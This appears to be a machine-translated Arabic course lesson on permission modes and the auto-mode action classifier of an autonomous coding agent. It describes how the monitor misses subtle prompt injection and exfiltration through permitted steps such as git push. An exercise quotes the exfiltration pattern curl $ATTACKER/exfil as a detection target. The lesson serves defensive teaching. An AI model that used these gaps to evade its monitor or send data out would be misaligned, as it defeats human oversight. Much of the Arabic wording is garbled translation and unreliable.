# طرق الإذن للوكلاء المستقلين

> سلم الإذن  مستويات متدنية من الاستقلال من مراجعة كل عمل إلى الموافقة على كل شيء  هو كيفية حكم الحزام ما يمكن للعميل المستقل القيام به دون أن يطلب. كود كود، مثال العمل في هذا الدروس، يظهر ستة من هذه الطرق: "الخطة" تسأل قبل كل عمل، "التنفيذ" (مسموم "اليدوية" في واجهة المستخدم) يسأل فقط للمخاطر، "قبل إصدارات" تلقائي الموافقة على الملف يكتب ولكن لا يزال يؤكد تنفيذ القذيفة، و "التغيب Permissions" يوافق على كل شيء. الوضع التلقائي  ال `auto`وضع الإذن  يحل محل الموافقة على كل إجراء بنموذج تصنيف منفصل يراجع كل إجراء قبل أن يتم تشغيله ويحجب أي شيء يتجاوز ما طلبه الطلب. يتم تطبيق ميزانيات العمل عبر `max_turns`و`max_budget_usd`. توافر `auto`يعتمد على الخطة، وتمكين المنظمة، النموذج، والمقدم  و أنثروبيك صراحة أن المصنف لا يكفي وحده.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator), TypeScript
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## المشكلة

وكيل التشفير المستقل على جهازك هو فئة أمن متميزة. سطح الهجوم هو كل شيء يمكن للوكيل الوصول إليه  نظام الملفات، الشبكة، والإثباتات، واللوحة المقطوعة، أي علامة التبويب المتصفح، أي محطة مفتوحة. بروس شنيير وغيرهم قد أشاروا إلى هذا علنا: وكلاء استخدام الكمبيوتر ليست "تحديث ميزة" من الروبوتات، فهي نوع جديد من الأدوات مع نوع جديد من ملف الخطر.

نظام الإذن لـ (كلود كود) هو إجابة (أنثروبيك) بدلاً من مبدء "متحكم / غير متحكم" واحد ، هناك ستة أوضاع تتجاوز سلم القدرات: خطة → افتراضية → قبول إصدارات → ... → تجاوز الإذن. كل وضع هو توازن مختلف بين السرعة والتحقق من الفعل. وضع السيارات (مارس 2026) يضيف نموذج تصنيف منفصل يزيل الموافقة عن المسار الحرج للمستخدم: فإنه يراجع كل عمل قبل أن يتم تشغيله ويحجب أي شيء يتصاعد خارج الطلب.

السؤال الهندسي: ما الذي يلتقطه هذا النظام، ما الذي يفوته، وما هو النمط الذي تؤدي به مهمة معينة في الواقع؟

## المفهوم

### الوضع الستة

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(الأسماء المذكورة أعلاه تتطابق مع وثائق كود كلوود العامة؛ و علامات UI `default`"اليدوية".)

### الوضع التلقائي في صفحة واحدة

وضع السيارات (الذي تم إطلاقه في 24 مارس 2026) هو أول وضع تصريح للتفويض على موافقة كل عمل على نموذج. الهيكل:

1. **A separate classifier model.**يقوم بمراجعة كل إجراء مقترح قبل أن يتم تشغيله، ويحكم عليه على المهمة المعلنة وحالة الجلسة الحالية، ويحجب أي شيء يتجاوز ما يطلبه الطلب.
2. **Gated availability.**هل`auto`ويعتمد على الخطة و إمكانيات التنظيم و النموذج و المزود

تُقيم ضوابط الميزانية جنباً إلى جنب مع المصنف:

- `max_turns` إجمالي التكرارات في جلسة.
- `max_budget_usd`-الحد الأقصى للدولار الذي يمنع الجلسة
- حدود عدد الإجراءات لكل أداة (لا تزيد عن N `WebFetch`مكالمات الخ)

### ما يلتقطه النظام

- الحقن المباشر في مدخلات الأداة حيث يتم رسم التعليمات المحققة إلى شكل عمل معروف مخاطر.
- حلقات الأداة المتكررة  يمكن للمصنف أن يرى أن الإجراء N+1 هو متطابق تقريبًا مع الإجراء N ، خمس مرات على التوالي.
- واضحة خارج نطاق القاعدة القذيفة في جلسة غيرها من إصدار الملفات فقط.

### ما يمكن أن يفوت النظام

- **Subtle prompt injection**التي تقوم بتحكم السلوك دون إنتاج عمل واحد معين. لا يعد حقن الإشارة المباشرة عرضة للشعور بالضعف الذي يمكن تصحيحه بالكامل (قسم إعداد OpenAI، 2025, على وكلاء المتصفحين  انظر الدروس 11).
- **Semantic-level misbehavior.**كل عمل فردي يمكن أن يبدو آمناً بينما المسار المكوّن ضار. يحكم المصنف على العمل؛ فإنه لا يعيد استنتاج نية المستخدم.
- **Exfiltration through legitimate channels.**كتابة البيانات إلى ملف تملكه، ثم `git push`إعادة التأمين العام، هو سلسلة من الإجراءات المسموح بها التي هي المشكلة.

### إطار لمشاهدة البحث

أرسلت (أنثروبيك) وضع السيارات كتحريص مقدم الوثائق واضحة أن المصنف هو طبقة، وليس حل: من المتوقع أن يجمع المستخدمون وضع السيارات مع الميزانيات، والمساعدات، ومناطق العمل المعزولة، ومراجعات المسار (الدرس 1216). يعكس إطار المشاهدة المسبقة أيضًا الفجوة الموثقة بين التقييم مقابل التنفيذ (الدرس 1)  يمكن للمصنف الذي يمر بتقييمات خارج الاتصال أن يتصرف بشكل مختلف في جلسة حقيقية حيث يكون سياق المستخدم غامضًا.

### حيث يعيش هذا السلم في سير عملك

- مهمة غير مألوفة: البدء في العمل`plan`قراءة الخطة أرخص من التراجع عن السوء
- المُعروف:`acceptEdits`يُحفظ الكثير من النقرات التأكيدية.
- تشغيل خلفية غير مرصدة: `auto`فقط داخل مساحة عمل قد قيّمت قطرها (لا توثيقات، لا تركيبات إنتاج، لا خروج لم تختار).
- الحاويات الفارغة: `dontAsk`- لا ، لا`bypassPermissions`المقبول إذا كانت الحاوية وذات الأوثاق القابلة للتصرف

```figure
autonomy-oversight
```

## استخدمها

`code/main.py`يحتاكي تصنيف مراجعة العمل كخط أنابيب مزدوجة  تبسيط التدريس؛`auto`يتم دعم النظام بواسطة نموذج تصنيف منفصل ، وليس عقد مكتوب من مرحلتين. مرحلة 1 هي قاعدة كلمة رئيسية رخيصة على الإجراءات المقترحة. مرحلة 2 هي مراجعة متعددة القواعد البطيئة. يقوم السائق بتغذية مسار اصطناعي قصير (إجراءات آمنة ، محاولة حقن سريعة ، حلقة متكررة) ويعرض أين يلتقط المصنف وأين يخطأ.

## أرسله

`outputs/skill-permission-mode-picker.md`يطابق وصف المهمة مع وضع الإذن الصحيح، والحد الأقصى للميزانية، والعزل المطلوب.

## التمارين

1. أركض`code/main.py`أي نوع من النوعات الاصطناعية لا يتم إشارة به أبداً من قبل المرحلة الأولى ولكن دائماً يتم القبض عليه من قبل المرحلة الثانية؟

2. تمديد قاعدة المرحلة 1 التي تعيينها لالتقاط شكل معين معروف سيء (مثل: `curl $ATTACKER/exfil`) قياس معدل الإيجابية الخاطئة على عينة العمل الخير.

3. اقرأ وثيقة "كيف يعمل حلقة الوكيل" من "أنثروبيك" قم بإدراج كل حالة خارجية يلمسها الوكيل بشكل افتراضي في`default`أيّة ستحتاج إلى البوابة بشكل منفصل قبل التشغيل`auto`بدون مراقبة؟

4. تصميم ميزانية 24 ساعة بدون مراقبة: `max_turns`،`max_budget_usd`، كوبات لكل أداة، وسموحات، وبرر كل رقم

5. وصف مسار واحد حيث يتم موافقة كل عمل فردي من قبل المصنف، ومع ذلك السلوك المكوّن غير متسلسل. (تغطي الدروس 14 كيفية حل هذه المسألة من خلال مفاتيح القتل والرموز القناري).

## الشروط الرئيسية

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## المزيد من القراءة

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) أنماط الإذن، الميزانيات، شكل العمل.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) نموذج تنفيذ الخدمات المدارة.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) إعلان سطح الميزات والوضع السريع.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) الطبقة القائمة على العقل التي تشكل أحكام المصنف.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) منظور داخلي لتصميم الإذن طويل الأفق.
